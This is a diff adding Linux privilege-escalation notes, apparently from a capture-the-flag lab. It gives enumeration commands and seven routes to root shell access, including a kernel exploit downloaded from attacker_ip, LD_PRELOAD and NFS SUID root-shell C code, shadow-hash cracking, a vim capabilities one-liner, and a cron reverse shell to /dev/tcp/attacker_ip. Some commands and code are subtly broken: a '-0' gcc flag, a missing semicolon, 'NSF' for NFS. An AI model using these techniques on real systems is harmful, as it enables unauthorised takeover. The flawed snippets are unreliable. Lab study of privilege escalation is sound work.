@@ -1,0 +1,130 @@
+First step to take when you gain acces - ENUMERATION
+
+HOSTNAME
+UNAME -A - system infos
+/PROC/VERSION -	target system processes (kernel version and what compiler is installed - GCC)
+/ETC/ISSUE - identified the system
+PS - running processes (ps -A; ps axjf - process tree; ps aux)
+ENV - environmental variables
+SUDO -L - command that can be used with root privileges
+LS - list (ls -la)
+ID - user's privilege level and group memberships
+/ETC/PASSWD - discover users on system (CUT AND COVERTED TO A USEFUL LIST FOR BRUTE-FORCE ATTACKS - cat /etc/passwd | cut -d ":" -f 1; cat /etc/passwd | grep home - real users)
+HISTORY
+IFCONFIG
+IP ROUTE
+NETSTAT (netstat -at(u); -l; -s(-t and -u); -tp; -i; -ano)
+FIND (find / -type f -name flag.txt 2>/dev/null; find / -type f -perm -04000 2>/dev/null)
+FIND, LOCATE, GREP, CUT, SORT
+
+AUTOMATED ENUMERATION TOOLS
+    LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
+    LinEnum: https://github.com/rebootuser/LinEnum
+    LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
+    Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
+    Linux Priv Checker: https://github.com/linted/linuxprivchecker
+
+ 
+
+1. PrivEsc: Kernel Exploit
+we found the version of linux kernel 3.13.0-24-generic (Ubuntu 14.04 LTS+Python 2.7.6)
+we access the server via ssh - but in least privileged user mode
+we search on exploit-db for an exploit that affect the kernel version (CVE-2015-1328) - exploit 37292.c
+save the exploit on the attacker machine and run a http server (python3 -m http.server 9000)
+on the target machine download the exploit (wget http://attacke_ip:9000/37292.c) and give compile it (gcc 37292.c -0 37292)
+now run the exploit (./37292)
+make the shell interractive (bash -i)
+verify the privileges you have (whoami; id) - YOU ARE NOW ROOT!!!
+
+
+2. PrivEsc: SUDO
+we access the server via ssh - but in least privileged user mode
+we verufy what command can we do with sudo (sudo -l)
+a valuable resource git for this is hhtp://gtfobins.github.io/
+Leverage LD_PRELOAD (sudo -l ................... env_keep+=LD_PRELOAD)
+write a simple script shell.c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/bash");
+}
+compile the shell.c (gcc -fPIC -shared -o shell.so shell.c -nostartfiles)
+sudo LD_PRELOAD=/home/user/ldpreload/shell.so find - YOU ARE NOW ROOT!!!
+
+
+3. PrivEsc: SUID
+we access the server via ssh - but in least privileged user mode
+find all files with SUID or SGID bits set (find / -type f -perm -04000 -ls 2>/dev/null)
+a valuable resource git for this is hhtp://gtfobins.github.io/
+we found /bin/nano has these bits seted
+nano /etc/passwd - we found the system users (looking for root privileged user)
+nano /etc/shadow - we found the password hashes for this users
+we perform a brute force with john the ripper on the attacker machine (john --wordlist=/usr/share/wordlist/rockyou.txt /path/to/hash/file)
+connect with the root privileged user credentials (su user and type password) - YOU ARE NOW ROOT!!!
+
+
+4. PrivEsc: Capabilities
+we access the server via ssh - but in least privileged user mode
+list enabled capabilities (getcap -r / 2>/dev/null) - we found vim tool
+a valuable resource git for this is hhtp://gtfobins.github.io/
+./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")' - YOU ARE NOW ROOT!!!
+
+
+5.PrivEsc: Cron Jobs
+we access the server via ssh - but in least privileged user mode
+see cron jobs (cat /etc/crontab) - we found that backup.sh is run every minute
+modify the backup.sh to create a reverse shell
+(nano backup.sh)
+#!/bin/bash
+
+bash -i >& /dev/tcp/attacker_ip/9090 0>&1
+
+give execute permision to the backup.sh (chmod +x backup.sh)
+on the attacker machine open a tcp listener (nc -lnvp 9090) - YOU ARE NOW ROOT!!!
+
+
+6.PrivEsc: PATH
+we access the server via ssh - but in least privileged user mode
+looking for all files&folders with writable capabilities (find / -writable 2>/dev/null) - we found we have writable perm in /home/murdoch directory
+view PATH (echo $PATH)
+we add this directory to the PATH (export PATH=/home/murdoch:$PATH)
+we change the directory to this directory (cd /home/murdoch)
+we cerate a script that tries to launch a system binary called "thm"
+script.c
+#include<unistd.h>
+void main()
+{	setuid(0);
+	setgid(0);
+	system("thm");
+}
+we compile this script (gcc script.c -o script -w; chmod u+s script)
+we create the "thm" binary
+echo "/bin/bash" > thm
+chmod 777 thm
+we run the script (./script) - YOU ARE NOW ROOT!!!
+
+
+7.PrivEsc: NSF
+we access the server via ssh - but in least privileged user mode
+we look at NSF configuration (cat /etc/exports)
+on the attacker machine:
+we look for shared folder of the target machine (showmount -e 10.10.61.45) - we found /tmp directory is shared and has no_root_squash options set
+we create a directory under /tmp directory on the attacker machine (mkdir /tmp/test) and move to this directory (cd /tmp/test)
+we will mount the no_root_squash shares to our attacking machine and start building our executable (mount -o rw 10.10.61.45:/tmp /tmp/test/)
+nano nsf.c
+int main()
+{ setgid(0);
+  setuid(0);
+  system("/bin/bash")
+  return 0;
+}
+Ctrl+o-Enter-Ctrl+x
+we compile the code (gcc -static nsf.c -o nsf -w)
+we set the SUID bit (chmod +s nsf)
+on the target machine we will go to /tmp directory and run the script (cd /tmp + ./nsf) - YOU ARE NOW ROOT!!!
+
